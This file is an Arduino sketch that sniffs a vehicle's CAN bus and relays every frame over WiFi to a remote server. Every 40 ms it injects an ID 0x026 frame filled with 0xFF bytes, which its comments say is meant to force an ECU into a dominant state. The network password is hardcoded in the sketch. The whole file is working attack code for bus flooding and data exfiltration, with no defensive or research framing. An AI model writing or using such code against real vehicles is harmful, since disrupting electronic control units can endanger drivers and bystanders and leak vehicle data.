#include <SPI.h>
#include <WiFi101.h>
#include <mcp_can.h> // Include CAN bus library, make sure to install this library first

// Set CAN bus parameters 
#define CAN_CS_PIN 10 // CAN bus chip select pin
MCP_CAN CAN(CAN_CS_PIN); // Initialize CAN bus object
// WiFi credentals 
char ssid[] = "BAH-2G";
char pass[] = "edwin-carl-james";

// Destination IP and port
IPAddress serverIP(192, 168, 1, 34);
int serverPort = 8888;

// Set the MAC address for the board if needed
byte mac[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };

// Define the CAN jmessage 
struct CAN_Message {
    unsigned int id; // Arbitration ID (CAN ID)
    unsigned char data[8]; // Data bytes
    unsigned char length; // Data length (in bytes)
};

// Timer variables 
unsigned long previousMillis = 0;
const long interval = 40; // Interval in milliseconds (1000 ms / 25 frames per second)

void setup() {
    Serial.begin(9600);

    // Connect to WiFi network
    WiFi.begin(ssid, pass);
    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.print(".");
    }
    Serial.println("");
    Serial.println("WiFi connected");
    Serial.println("IP address: ");
    Serial.println(WiFi.localIP());

    // Initalize CAN bus
    if (CAN.begin(MCP_ANY, CAN_500KBPS, MCP_8MHZ) == CAN_OK) {
        Serial.println("CAN bus initialized");
    } else {
        Serial.println("Error initializing CAN bus");
        while (1); // Halt if initialization fails
    }
}

void loop() {
    unsigned long currentMillis = millis();

    // Read CAN traffic
    CAN_Message canMessage;
    if (CAN_MSGAVAIL == CAN.checkReceive()) {
        // Read the message 
        unsigned char len = 0;
        unsigned char buf[8]; // Buffer to store data bytes
        CAN.readMsgBuf((long unsigned int*)&canMessage.id, NULL, &len, buf); // Passing id, len and buf correctly
        canMessage.length = len;
        memcpy(canMessage.data, buf, 8);

        // Relay data to server (if needed)
        relayDataToServer(canMessage);
    }

    // Check if it's time to send the CAN message
    if (currentMillis - previousMillis >= interval) {
        // Save the last time a CAN message was sent
        previousMillis = currentMillis;

        // define CAN message to force ECU into dominant state
        CAN_Message forceDominantMessage;
        forceDominantMessage.id = 0x026; // Arbitration ID (CAN ID)
        for (int i = 0; i < 8; i++) {
            forceDominantMessage.data[i] = 0xFF; // dominant data bytes
        }
        forceDominantMessage.length = 8; // Data length (in bytes)

        // Send CAN message to force ECU into dominant state
        CAN.sendMsgBuf(forceDominantMessage.id, 0, forceDominantMessage.length, forceDominantMessage.data);
    }
}

void relayDataToServer(CAN_Message message) {
    // Connect to the server
    WiFiClient client;
    if (!client.connect(serverIP, serverPort)) {
        Serial.println("Connection to server failed");
        return;
    }

    // Send data to server
    if (client.connected()) {
        // Construct message string
        String messageString = "CAN ID: 0x";
        messageString += String(message.id, HEX) + ", Data: ";
        for (int i = 0; i < message.length; i++) {
            messageString += "0x" + String(message.data[i], HEX);
            if (i < message.length - 1) {
                messageString += ", ";
            }
        }

        // Send message string to server
        client.println(messageString);
    }
}
